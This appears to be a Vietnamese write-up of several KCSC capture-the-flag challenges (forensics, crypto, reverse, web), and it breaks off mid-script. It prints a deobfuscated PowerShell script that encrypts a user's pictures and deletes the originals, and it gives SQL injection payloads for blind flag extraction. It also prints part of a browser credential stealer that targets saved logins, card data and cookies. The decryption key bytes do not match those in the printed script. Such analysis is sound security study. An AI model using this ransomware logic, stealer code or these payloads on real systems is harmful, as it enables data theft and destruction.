# _Powershell 101_ _(FORENSICS)_

![image](https://github.com/user-attachments/assets/79a16db8-500e-4172-b64c-2800d0111b0e)

## _Solution_

Tải về mình nhận được một tệp **pwsh101.zip**, giải nén ra thì có file **s.ps1** và 1 folder **Pictures** ( gồm tất cả các ảnh đã bị encrypt )

![image](https://github.com/user-attachments/assets/15b806ec-f56e-42fa-9406-5dbb36fea310)
![image](https://github.com/user-attachments/assets/2cb04a7d-9b6f-4464-aeb9-8b6b0d0f2cd9)

Mở file s.ps1 ra thì thấy có 1 đoạn base64

![image](https://github.com/user-attachments/assets/28592ee4-9b2d-43e9-99d6-991f4e554c7f)

Đem lên cyberchef decrypt thì nhận được 1 đoạn script PowerShell đã bị obfuscation

![image](https://github.com/user-attachments/assets/2ce95f93-57cf-4271-ae63-15897971abb3)

Đem đi làm đẹp lại cho dễ đọc hơn

```
# Define variables and types
Set-Variable -Name "gxqh" -Value ([Type]"System.Security.Cryptography.CipherMode")
$CipherPadding = [Type]"System.Security.Cryptography.PaddingMode"
$TextEncoding = [Type]"System.Text.Encoding"
Set-Variable -Name "lc3Zj8" -Value ([Type]"System.IO.Compression.CompressionMode")
Set-Variable -Name "arZ3" -Value ([Type]"System.Convert")
Set-Variable -Name "ulZ2" -Value ([Type]"System.IO.Path")
Set-Variable -Name "0Upe6" -Value ([Type]"System.Security.Principal.WindowsPrincipal")

# Encryption function
function Encrypt {
    param($InputFile, $OutputFile)

    # Create AES instance
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = $gxqh::CBC
    $aes.Padding = $CipherPadding::Zeros
    $aes.BlockSize = 128
    $aes.KeySize = 256

    # Set IV and Key
    $aes.IV = [byte[]](0x3F, 0x45, 0x2B, 0x4D, 0x62, 0x51, 0x65, 0x53, 0x68, 0x56, 0x6D, 0x59, 0x71)
    $aes.Key = [byte[]](0x61, 0x42, 0x4A, 0x40, 0x4E, 0x63, 0x52, 0x66, 0x55, 0x6A, 0x58, 0x21, 0x41, 0x25)

    # Create encryptor and read plaintext
    $encryptor = $aes.CreateEncryptor()
    $plainBytes = Get-Content -Path $InputFile -Encoding Byte

    # Encrypt plaintext
    $encryptedText = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $aes.Dispose()

    # Convert encrypted text to Base64
    $base64String = $arZ3::ToBase64String($encryptedText)
    $base64Bytes = $TextEncoding::UTF8.GetBytes($base64String)

    # Compress Base64 string
    $memoryStream = New-Object System.IO.MemoryStream
    $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, $lc3Zj8::Compress, $true)
    $deflateStream.Write($base64Bytes, 0, $base64Bytes.Length)
    $deflateStream.Flush()
    $deflateStream.Close()

    # Convert compressed data to Base64 and write to output
    $compressedData = $arZ3::ToBase64String($memoryStream.ToArray())
    Write-Output $compressedData | Out-File -FilePath $OutputFile
}

# Find image files in a specific directory
$CurrentUser = $0Upe6::GetCurrent().Name.Substring(16)
$ImagesDirectory = "C:\Users\$CurrentUser\OneDrive\Pictures"
$ImageFiles = Get-ChildItem -Path $ImagesDirectory -Recurse |
    Where-Object { $_.Extension -in '.jpg', '.png', '.jpeg', '.bmp' } |
    Select-Object -ExpandProperty FullName

# Process each image file
foreach ($file in $ImageFiles) {
    $ParentDirectory = (Get-Item $file).Directory.FullName
    $FileNameWithoutExtension = $ulZ2::GetFileNameWithoutExtension($file)
    $OutputFile = Join-Path -Path $ParentDirectory -ChildPath "$FileNameWithoutExtension.enc"

    # Encrypt the file
    Encrypt -InputFile $file -OutputFile $OutputFile

    # Remove original file
    Remove-Item -Force $file
}
```
Kịch bản của đoạn script Powershell như sau:

```
1. Khai báo biến và kiểu dữ liệu
Mục đích: Tạo các biến để tham chiếu đến các lớp cụ thể trong .NET nhằm hỗ trợ mã hóa, nén và xử lý dữ liệu.
Các biến được định nghĩa:
- gxqh: Đại diện cho chế độ mã hóa AES (CipherMode).
- CipherPadding: Chỉ định chế độ đệm của AES (PaddingMode).
- TextEncoding: Tham chiếu đến lớp mã hóa văn bản (System.Text.Encoding).
- lc3Zj8: Quản lý chế độ nén (CompressionMode).
- arZ3: Sử dụng để chuyển đổi dữ liệu (System.Convert).
- ulZ2: Dùng để xử lý đường dẫn tệp (System.IO.Path).
- 0Upe6: Đại diện cho người dùng hiện tại trên hệ thống Windows (WindowsPrincipal).

2. Hàm mã hóa (Encrypt)
Mục đích: Mã hóa nội dung của tệp và nén dữ liệu trước khi lưu.
Chi tiết hoạt động:

 - Tạo đối tượng AES:
Sử dụng AES với chế độ CBC (Cipher Block Chaining) và đệm kiểu Zeros.
Kích thước khối: 128-bit; Kích thước khóa: 256-bit.

 - Thiết lập IV (Vector Khởi tạo) và Key:
IV và Key được xác định trước trong dạng mảng byte. Điều này cho thấy khóa mã hóa cố định, làm giảm tính bảo mật nếu mã này được lặp lại trên nhiều máy.

 - Đọc nội dung tệp:
Đọc tệp đầu vào dưới dạng byte và thực hiện mã hóa với TransformFinalBlock.

- Chuyển đổi mã hóa sang Base64:
Chuỗi mã hóa được chuyển sang dạng Base64 để dễ dàng lưu trữ và xử lý.

 - Nén dữ liệu:
Dữ liệu Base64 được nén bằng DeflateStream.
Ghi kết quả vào tệp đầu ra:
Tệp kết quả được lưu với phần mở rộng .enc.
```

Nhiệm vụ của mình giờ là **decrypt** -> **lấy lại tệp ảnh gốc** -> **flag** (**Decrypt** sẽ là làm ngược lại các thao tác khi **Encrypt**)

Và đây là số lượng file đã bị **encrypt**

![image](https://github.com/user-attachments/assets/8ac50783-b30c-4894-81c5-d19f4667ef90)

Mình có viết 1 script Python để thực hiện điều này

```
import base64
import io
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def decrypt(input_file, output_file):

    # IV và Key từ PowerShell script
    iv = bytes([0x3f, 0x45, 0x28, 0x48, 0x2b, 0x4d, 0x62, 0x51, 0x65, 0x53, 0x68, 0x56, 0x6d, 0x59, 0x71, 0x33])
    key = bytes([0x43, 0x26, 0x46, 0x29, 0x4a, 0x40, 0x4e, 0x63, 0x52, 0x66, 0x55, 0x6a, 0x58, 0x6e, 0x32, 0x72, 0x34,
                 0x75, 0x37, 0x78, 0x21, 0x41, 0x25, 0x44, 0x2a, 0x47, 0x2d, 0x4b, 0x61, 0x50, 0x64, 0x53])

    # Đọc mã base64 nén từ tệp bị encrypt ở dạng nhị phân
    try:
      with open(input_file, 'rb') as f:
          compressed_data_b64 = f.read()
    except Exception as e:
      print(f"Error reading file: {e}")
      return
    
    # Giải mã dữ liệu base64 đã nén
    try:
        compressed_data = base64.b64decode(compressed_data_b64)
    except Exception as e:
        print(f"Error during initial base64 decoding: {e}")
        return

    # Giải nén data bằng zlib
    try:
        decompressed_data = zlib.decompress(compressed_data, wbits=-zlib.MAX_WBITS)
    except Exception as e:
        print(f"Error during decompression: {e}")
        return
    
    # Giải mã chuỗi base64
    try:
        base64_string = decompressed_data.decode('utf-8')
        encrypted_bytes = base64.b64decode(base64_string)
    except Exception as e:
        print(f"Error during secondary base64 decoding: {e}")
        return


    # Khởi tạo mật mã AES
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Giải mã và xóa padding(\x00)
    try:
        decrypted_bytes = cipher.decrypt(encrypted_bytes)
        # Remove padding 
        decrypted_bytes = decrypted_bytes.rstrip(b'\x00') 
    except ValueError as e:
        print(f"Error during decryption (possible padding error): {e}")
        return

    # Lưu data decrypt vào file mới
    with open(output_file, 'wb') as outfile:
        outfile.write(decrypted_bytes)

if __name__ == '__main__':
    # Example usage:
    encrypted_file = "E:\\Python\\gundam.enc"  # File đầu vào bị mã hóa
    decrypted_file = "1.txt" # File gốc

    decrypt(encrypted_file, decrypted_file)
    print(f"Decrypted data written to: {decrypted_file}")
```
Đoạn scrypt trên sẽ thực hiện

```
- Giải nén tệp nén (compressed file) bằng Zlib.

- Chuyển đổi dữ liệu Base64 về dạng mảng byte.

- Giải mã dữ liệu bằng AES để lấy nội dung tệp gốc.

- Lưu dữ liệu đã giải mã thành tệp ảnh ban đầu.
```
Mình sẽ thực hiện lần lượt với từng file bằng cách thêm file .enc vào hàm này

```
encrypted_file = "E:\\Python\\Important.enc" 
```
Và đã có kết quả ở file **Important.enc**

![3](https://github.com/user-attachments/assets/43586728-f106-40dc-9300-fe38f3079069)

Thêm format KCSC và có được flag

```
Flag: KCSC{S0m3t1m3_R3co\_/ery_1s_EasieR_Th@n_y0u_Thought}
```


# _HDSD_ _(FORENSICS)_

![image](https://github.com/user-attachments/assets/5da2ad17-c163-4e64-998c-8e8023e4855d)

## _Solution_

Truy cập gg drive, mình nhận được một tệp .ad1

Với cảnh báo của author, mình cho vô máy ảo và dùng **FTK imager** để phân tích

![image](https://github.com/user-attachments/assets/7369af86-4001-4cbd-9972-b010237db52f)

Mình liền kiểm tra các thư mục mà người dùng thường xuyên làm việc như **Download, Desktop, Documents**

Tại **Download**, mình tìm thấy một số file trong đó có file **Voucher_hoc_bong_chuyen_auto_pass_mon.txt.cucked** nhưng với extension lạ khả năng cao là đã bị encrypt

![image](https://github.com/user-attachments/assets/c6c7a113-ef19-426f-8779-b2b850b8269f)

Sau chút ít thời gian ngồi mò, thì mình tìm thấy một file **tmp4029.tmp** trong thư mục ***users/SERVER/AppData/Local/Temp***

![image](https://github.com/user-attachments/assets/fc0fc53c-7b8a-41bb-ae2e-f9c2ca8e4473)

Và đây là nhận định ban đầu về nội dung tệp 

```
1. Script thực thi
Tệp ghi lại toàn bộ mã PowerShell được thực thi, cụ thể:

- Hàm XOR-String: Tạo khóa mã hóa (Key) và vector khởi tạo (IV) từ tên máy tính (PCName) bằng phép XOR với chuỗi tĩnh "UwU" và "XD

- Hàm Encrypt-File: Dùng AES để mã hóa các tệp.

- Lệnh Get-ChildItem và vòng lặp ForEach-Object: Tìm kiếm tất cả các tệp trong hệ thống và:

- Mã hóa chúng với AES.

- Ghi tệp đã mã hóa với phần mở rộng .cucked.

- Xóa tệp gốc nếu tệp đã mã hóa thành công.

2. Metadata từ log

Provider: Microsoft-Windows-PowerShell (cho biết mã PowerShell được thực thi).

EventID 4104: Xác định rằng đây là log ScriptBlock ghi lại nội dung mã lệnh PowerShell đã chạy.

ScriptBlockId: 86c0c4bd-646f-4363-918c-e9f50950fd92 là mã định danh duy nhất cho đoạn mã này.

TimeCreated: Ghi lại thời điểm script được thực thi: 2025-01-16T03:48:32.8070960Z.

UserID: S-1-5-21-3487867894-2063063461-3586319887-1001 đại diện cho người dùng đã chạy script, thuộc máy tính DESKTOP-SH94VUS.

```

Và khi làm xong mình có tìm hiểu tại sao nó nằm trong thư mục **TEMP**:

```
Tệp log này được tạo bởi hệ thống (Windows PowerShell), ghi lại toàn bộ nội dung script PowerShell khi nó được thực thi.

Thư mục TEMP là nơi hệ thống hoặc ứng dụng tạo các tệp tạm thời, nên việc log PowerShell xuất hiện ở đây là điều bình thường khi kênh PowerShell/Operational được bật.
```

Ok giờ quay lại với vấn đề chính là đoạn script đã thực hiện mã hóa file gốc thành file .cucked và đã xóa file gốc đi

Thì như bài trước mình sẽ lại thực hiện ngược lại với quá trình mã hóa để tiến hành giải mã

Giải mã thì cần có PCNAME, mình đã tìm nhìn thấy ngay mà không cần export file **SYSTEM** rồi đem vô **REGISTRY EXPOLER**

```
PCNAME: DESKTOP-SH94VUS 
```

Và đây là script giải mã

```
import os
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

def xor_strings(input_string, key):

    input_bytes = input_string.encode('utf-8')
    key_bytes = key.encode('utf-8')
    output_bytes = bytearray()
    for i, byte in enumerate(input_bytes):
        output_bytes.append(byte ^ key_bytes[i % len(key_bytes)])
    return output_bytes.decode('utf-8')

def decrypt_file(input_file, output_file, key_bytes, iv_bytes):
    
    try:
        with open(input_file, 'rb') as file:
            encrypted_bytes = file.read()

        cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv_bytes), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_bytes = decryptor.update(encrypted_bytes) + decryptor.finalize()

      
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_bytes = unpadder.update(decrypted_bytes) + unpadder.finalize()

        with open(output_file, 'wb') as file:
            file.write(unpadded_bytes)
    except Exception as e:
         print(f"Lỗi khi giải mã tệp {input_file}: {e}")
         return False
    return True

if __name__ == "__main__":
    pc_name = "DESKTOP-SH94VUS"
    key = xor_strings(pc_name, "UwU")
    iv = xor_strings(pc_name, "XD")
    
    key_bytes = key.ljust(16)[:16].encode('utf-8')
    iv_bytes = iv.ljust(16)[:16].encode('utf-8')

    print ("Đang thử giải mã file...")
    for root, _, files in os.walk("."):
        for file in files:
           if file.endswith(".cucked"):
                input_file = os.path.join(root, file)
                output_file = input_file[:-7] 

                if decrypt_file(input_file, output_file, key_bytes, iv_bytes):
                    print(f"Đã giải mã thành công {input_file} thành {output_file}")
                    try:
                        os.remove(input_file) 
                        print(f"Đã xóa file đã mã hóa {input_file}")
                    except Exception as e:
                        print(f"Lỗi khi xóa file đã mã hóa {input_file}: {e}")
                else:
                   print(f"Giải mã file {input_file} thất bại")
    print ("Hoàn tất giải mã")
```

Chi tiết:

```
1. Hàm xor_strings

Mục đích: Thực hiện phép XOR giữa một chuỗi đầu vào (input_string) và một khóa (key) để tạo chuỗi kết quả.

Cách hoạt động:
 - Chuyển chuỗi đầu vào và khóa thành mảng byte (input_bytes, key_bytes).
 - Duyệt từng byte trong chuỗi đầu vào và XOR với byte tương ứng trong khóa (lặp lại khóa nếu cần).
 - Kết quả là một mảng byte (output_bytes), sau đó được chuyển lại thành chuỗi (decode('utf-8')).

2. Hàm decrypt_file
Mục đích: Giải mã một tệp đã mã hóa với AES-CBC.

CÁC BƯỚC:

Đọc dữ liệu mã hóa từ tệp:

 - Mở tệp mã hóa (input_file) ở chế độ nhị phân ('rb').
 - Đọc toàn bộ dữ liệu mã hóa (encrypted_bytes).

Giải mã AES:
 - Tạo đối tượng Cipher với thuật toán AES, chế độ CBC, khóa (key_bytes) và vector khởi tạo (iv_bytes).
 - Tạo decryptor từ cipher.decryptor().
 - Giải mã dữ liệu với decryptor.update() và decryptor.finalize().

Bỏ padding (unpadding):
 - Do AES-CBC yêu cầu dữ liệu phải có độ dài bội số của kích thước khối (16 byte), padding đã được thêm vào khi mã hóa.
 - Dùng PKCS7 unpadder để loại bỏ padding và khôi phục dữ liệu gốc (unpadded_bytes).

Ghi dữ liệu đã giải mã ra tệp:
 - Mở tệp đầu ra (output_file) và ghi dữ liệu đã giải mã (unpadded_bytes).

```

Chạy mã và done

![image](https://github.com/user-attachments/assets/952f3f24-2e0f-47a3-ba50-42ce7e2b3d8c)


Mở tệp **Voucher_hoc_bong_chuyen_auto_pass_mon.txt** là lấy được flag

![image](https://github.com/user-attachments/assets/65d73c8e-04e3-426c-819d-50bc7bd27bdb)

```
Flag: KCSC{the^?_cha^'t_KMA_la`_nhung~_niem`_dau}
```

# __CRYPTO_1_(CRYPTO)_

![image](https://github.com/user-attachments/assets/d2241a38-48dd-4d88-b462-60cab3da7e75)

## _Solution_

Tải về mình nhận được 1 file python với nội dung như sau

```
from Crypto.Util.number import *
from math import gcd

flag = b"KCSC{fake_flag}"

p = getPrime(512)
q = getPrime(512)
n = p*q
e = 0x10001
c = pow(bytes_to_long(flag), e, n)

print(f"n = {n}")
print(f"c = {c}")
print(13 * q ** 2 + 5*p * q + 2 * p ** 5)
print(7 * q ** 3 + p ** 3)

"""
n = 68288521803749096598885637638053621717196600162883393314204537792265324550130476000830582459892601191221713398147068471895218340440441520348186049243098557276069294337290348570168822004443403024217772173472817801983123070596861372926544266786307347422625999741472764054251261966242723803223755250857431959613
c = 51484360656675894405169578577777421818221080188874188339332704212766014455602299232733441854614491353614936672698767100621643701474052897096397257567627546370308824123953740553988694850896612092526733722171750215446879926157508653359056454370778767748861899945472045315573513667461778478951641271690253340703
99070322718633589075437462797565157261778565342202176866775343970398558639214129862647491552411934954337080928975984888590350647667063750589996693551004764949048370796506334502440334616612079528441181921243264137829513725003752633040825654275249100544290948338516838946174770287568358642193272862193796894044937197882972942736350187023160283258646203934697126833099845086570117310993425665455046278368788256843647321433937611726466080931200057154600456738627871172358125025243308598393199170155505096434440339433895197600955266878886512068835988415711337072167542113641557473147599428014808952558696371214362762804029219711275834667722478355607836912560341298862576500518929722837267759516608623300378294362866958920710706131156072317563285732965572961520111862487408104
4053829493753080394597319030520465552249075460276768487813206903952134102796024072650537404512981555893331018255239607908419904554570951529767887735220350920134963507895001907309725345634404748146887358629605419756823088475689769294303699918630919892363333011358649952996211367887394670736389996674537151867058156643368735877078538193576703224594833465330136899282032495128158051461158831558808541670885217172490157676355847572589184884710346372276161554121356404

 """
```
Tổng quan đoạn mã trên:

![image](https://github.com/user-attachments/assets/b696189b-fbca-4333-bc6b-a7aef776c556)

Và đây là script Python để lấy flag

```
from Crypto.Util.number import *
from math import gcd
import sympy

n = 68288521803749096598885637638053621717196600162883393314204537792265324550130476000830582459892601191221713398147068471895218340440441520348186049243098557276069294337290348570168822004443403024217772173472817801983123070596861372926544266786307347422625999741472764054251261966242723803223755250857431959613
c = 51484360656675894405169578577777421818221080188874188339332704212766014455602299232733441854614491353614936672698767100621643701474052897096397257567627546370308824123953740553988694850896612092526733722171750215446879926157508653359056454370778767748861899945472045315573513667461778478951641271690253340703
eq1_val = 99070322718633589075437462797565157261778565342202176866775343970398558639214129862647491552411934954337080928975984888590350647667063750589996693551004764949048370796506334502440334616612079528441181921243264137829513725003752633040825654275249100544290948338516838946174770287568358642193272862193796894044937197882972942736350187023160283258646203934697126833099845086570117310993425665455046278368788256843647321433937611726466080931200057154600456738627871172358125025243308598393199170155505096434440339433895197600955266878886512068835988415711337072167542113641557473147599428014808952558696371214362762804029219711275834667722478355607836912560341298862576500518929722837267759516608623300378294362866958920710706131156072317563285732965572961520111862487408104
eq2_val = 4053829493753080394597319030520465552249075460276768487813206903952134102796024072650537404512981555893331018255239607908419904554570951529767887735220350920134963507895001907309725345634404748146887358629605419756823088475689769294303699918630919892363333011358649952996211367887394670736389996674537151867058156643368735877078538193576703224594833465330136899282032495128158051461158831558808541670885217172490157676355847572589184884710346372276161554121356404

# Use sympy to solve the equations for p and q
p, q = sympy.symbols('p q')

eq1 = 13 * q**2 + 5*p * q + 2 * p**5 - eq1_val
eq2 = 7 * q**3 + p**3 - eq2_val
eq3 = p*q - n

solutions = sympy.solve([eq1, eq2, eq3], [p, q])

#print(solutions)

# Extract the correct p and q. Since the results are complex, iterate and check if p and q are ints and p*q == n
p = 0
q = 0

for sol in solutions:
    p_candidate = sol[0]
    q_candidate = sol[1]
    if p_candidate.is_integer and q_candidate.is_integer:
        if (p_candidate * q_candidate) == n:
            p = int(p_candidate)
            q = int(q_candidate)
            break


#print(f"p = {p}")
#print(f"q = {q}")


# Calculate the totient
phi = (p - 1) * (q - 1)

# Calculate the modular inverse of e mod phi to get d
e = 0x10001
d = pow(e, -1, phi)

# Decrypt the ciphertext
flag_long = pow(c, d, n)

# Convert the decrypted number to bytes (flag)
flag = long_to_bytes(flag_long)

print(flag)
```

Chi tiết:

```
Lấy dữ liệu: Nhận thông tin n, c, và các phương trình toán học.

Tìm p và q: Sử dụng sympy để giải hệ phương trình và tìm ra các số nguyên tố p và q.

Tính toán khóa riêng: Tính phi và d.

Giải mã: Giải mã ciphertext c bằng khóa riêng d.

Hiển thị flag: Chuyển kết quả về dạng bytes và in ra.
```

Chạy mã và nhận được flag

![image](https://github.com/user-attachments/assets/4735bd16-dec7-4b07-95c2-8abc04985ac2)

```
Flag: KCSC{solv1ng_equ4ti0ns_with_r3sult4nts_is_f4n}
```

# __Hidden_(REVERSE)_

![image](https://github.com/user-attachments/assets/9ea3126f-59ed-433a-8682-66a9980d917d)

## _Solution_

Tải về nhận được 1 tệp .rar, giải nén có được file chal.exe

Dùng Detect it easy để xem được viết bằng gì

![image](https://github.com/user-attachments/assets/78359ac0-4a80-466b-86fc-0397dfa89cca)

Ok được viết bằng C, mình cho vô IDA để decompile

![image](https://github.com/user-attachments/assets/1a413191-1483-4c73-b3d3-5685a890b90d)

Thấy 1 flag KCSC{can_you_see_me??} nhưng hóa ra là fake flag

Mình nhấn F5 để dịch ngược tiếp về ngôn ngữ C

![image](https://github.com/user-attachments/assets/0770e516-a01d-432f-abb3-04b1f9733370)

Ok giờ thì đã dễ đọc hơn, mình nhìn cột bên trái thì thấy có hàm **printFlag** nhấn vô xem có gì

![image](https://github.com/user-attachments/assets/4eb26d0f-68a0-4e95-9a9d-9aeb5da9766b)

Đoạn mã trên là một hàm C có chức năng in ra một chuỗi ký tự đã được mã hóa. Chuỗi này sẽ được giải mã bằng một phép XOR với giá trị cố định 0x88 cụ thể:

```
v2[3]:Là một mảng chứa 3 phần tử kiểu _QWORD (tức là số nguyên 64-bit không dấu).

Dữ liệu trong mảng này được khởi tạo với các giá trị:

v2[0] = 0xFDE7F1F3CBDBCBC3;
v2[1] = 0xFBD7FCAFE6E9EBD7;
v2[2] = 0xF5FEB2EDE5D7EDED;

=> Đây là các giá trị mã hóa của chuỗi ký tự.

result: Là biến được sử dụng để lưu trạng thái trả về từ printf().

Vòng lặp for (i = 0; i <= 23; ++i):
Vòng lặp chạy 24 lần, tương ứng với số ký tự trong chuỗi cần giải mã (24 ký tự).
```

Và đây là script giải mã

```
v2 = [
    0xFDE7F1F3CBDBCBC3,
    0xFBD7FCAFE6E9EBD7,
    0xF5FEB2EDE5D7EDED
]

# Chuyển v2 thành mảng byte
data = b''.join(v.to_bytes(8, 'little') for v in v2)

# Giải mã bằng XOR với 0x88
decoded = ''.join(chr(byte ^ 0x88) for byte in data)
print(decoded)
```

Chạy code và có kết quả

```
Flag: KCSC{you_can't_see_me:v}
```

# _Check Member_ _(WEB)_

![image](https://github.com/user-attachments/assets/f1400526-c131-4985-a0e8-fe06ac69a386)

## _Solution_

Bài cho 1 trang web và 1 tệp .zip giải nén tệp ra được 1 folder db và 1 src

![image](https://github.com/user-attachments/assets/01046806-940a-4379-b2ad-781c62ad1b49)

![image](https://github.com/user-attachments/assets/556081f2-d07c-4971-9996-1bdb6b64c4bb)

Ban đầu, mình truy cập file index.php

![image](https://github.com/user-attachments/assets/3b2b84cd-d52b-43de-8175-7a636d9ffb3a)

```
Đoạn mã PHP trên là một đoạn script của ứng dụng web, xử lý yêu cầu GET và truy vấn cơ sở dữ liệu.

* Chức năng của mã
Kiểm tra tham số name từ yêu cầu GET:
- Nếu URL chứa tham số name (ví dụ: ?name=giatri), mã sẽ lấy giá trị của tham số này và gán vào biến $name.

Kiểm tra số lần xuất hiện của ký tự (:
- Sử dụng hàm substr_count để đếm số lần ký tự ( xuất hiện trong chuỗi $name.
- Nếu số lượng ký tự ( lớn hơn 1, chương trình dừng thực thi (die('Dont :(');) và hiển thị thông báo Dont :(.

Kết nối tới cơ sở dữ liệu MySQL với các thông tin sau:
- Máy chủ: mysql-db
- Tên người dùng: kcsc
- Mật khẩu: REDACTED (đã bị ẩn trong đoạn mã)
- Tên cơ sở dữ liệu: ctf
- Cổng: 3306
Truy vấn cơ sở dữ liệu:

Chạy truy vấn SQL: SELECT 1 FROM members WHERE name = '$name'
- Kiểm tra xem giá trị của $name có tồn tại trong bảng members hay không.
- Nếu có kết quả, in ra Found :). Nếu không, in ra Not found :(.
- Đóng kết nối cơ sở dữ liệu:

Sau khi hoàn tất truy vấn, kết nối với cơ sở dữ liệu sẽ được đóng bằng lệnh $mysqli->close();.
Dừng chương trình:

Kết thúc thực thi mã bằng lệnh die();.
```

Dễ nhận thấy đây là một lỗ hổng liên quan đến SQL injection

```
Ví dụ, một người dùng có thể gửi yêu cầu như sau để phá hoại cơ sở dữ liệu:

?name=giatri' OR '1'='1
```

![image](https://github.com/user-attachments/assets/44fdf2c5-54b9-4083-85e5-62746b2959ae)

Nhận thấy là luôn trả về found 

Và mình chú ý thêm đến init.spl

![image](https://github.com/user-attachments/assets/78a4b329-7ba1-43b4-a8e7-956b9e0df888)

Thấy trong file init.sql có bảng secrets với trường flag nên khả năng flag nằm trong đó

Nên mình dùng câu lệnh truy vấn xác định chuỗi flag xem có trong bảng đó hay không , nếu có thì trả found

```
KCSC' AND (SELECT flag FROM secrets LIMIT 1) LIKE 'K%' -- -
```

```
* Phân tích từng phần:

KCSC': Đây là giá trị nhập của trường name trong bảng members. Dấu ' được sử dụng để thoát khỏi chuỗi SQL ban đầu.

AND: Thêm điều kiện logic để kiểm tra một điều kiện khác.

(SELECT flag FROM secrets LIMIT 1):
- Truy vấn con này lấy giá trị của cột flag từ bảng secrets.
- LIMIT 1 đảm bảo rằng chỉ một giá trị đầu tiên trong cột flag được lấy (trong trường hợp có nhiều dòng trong bảng secrets).

LIKE 'K%':
- Kiểm tra xem giá trị lấy được từ truy vấn con (flag) có bắt đầu bằng ký tự K hay không.
- % là ký tự đại diện trong SQL, nghĩa là bất kỳ chuỗi nào theo sau chữ K đều hợp lệ.

-- -: Phần còn lại của truy vấn gốc bị bỏ qua do ký tự -- dùng để tạo bình luận trong SQL.
```

# _Trên đây là toàn bộ bài làm của mình khi chưa hết giải, sau khi kết thúc mình có solve thêm được 1 bài nữa_

# _Invitation_ _(FORENSICS)_

![image](https://github.com/user-attachments/assets/bb762492-dbd2-4287-90f6-dca67c218bd3)

Mình mất khá nhiều thời gian khi không chọn được hướng đi phù hợp cho bài khi giải đang diễn ra 😥

## _Solution_

Thử thách cho mình 1 tệp .zip giải nén ta có được 1 tệp .rar và cuối cùng là 1 file .cmd

![image](https://github.com/user-attachments/assets/a92574d1-b992-41e4-8634-4c56b85182f5)

```
- File .cmd là một tệp lệnh (batch file) trong hệ điều hành Windows. Tệp này chứa một chuỗi các lệnh mà hệ thống có thể thực thi trong Command Prompt (CMD). 
- Các lệnh này có thể bao gồm thao tác trên hệ thống, chạy các chương trình, và thực hiện các tác vụ tự động. 
- Tệp .cmd thường được sử dụng để tự động hóa các tác vụ, ví dụ như cài đặt phần mềm, sao lưu dữ liệu, hoặc cấu hình hệ thống.
```

Vì đây là lần đầu mình làm việc với file này nên mình cứ thử dùng hết các tool trích xuất chuỗi văn bản như strings hoặc cat

Và đây là lệnh cat

![image](https://github.com/user-attachments/assets/c549aab3-0e12-4140-adee-6a4201459ae4)

Có thể thấy 1 đoạn chuỗi kí tự vừa dài, vừa loằng ngoằng rất khó hiểu

Nhưng lướt xuống cuối thì mình thấy

![image](https://github.com/user-attachments/assets/9072780e-7707-4d7c-bd3f-54c19744149c)

Giữa những kí tự khó hiểu đó là một số đường dẫn và đây là nhận định của mình

```
- Dường như đây là một đoạn mã hoặc chuỗi lệnh trong một tệp .cmd, có vẻ liên quan đến việc tải về và giải nén một tệp từ một nguồn URL nhất định ở đây là raw.githubusercontent.com

- Sau đó thực thi một tệp PowerShell (powershell.exe) để thực hiện các thao tác tải tệp và giải nén. Một số phần của chuỗi cũng đề cập đến việc chạy một tệp thực thi python .exe
```

Mình nhìn thấy một link github có một tệp snake.zip mình liền tải về

Giải nén mình có được khá nhiều folder trong đó có các chương trình python, nhưng thứ mình quan tâm nhất là file WindowsUpdate.py do nó được đề cập trong đoạn mã khó hiểu ở trên

Và đây là nội dung bên trong file 

```
import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import requests

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
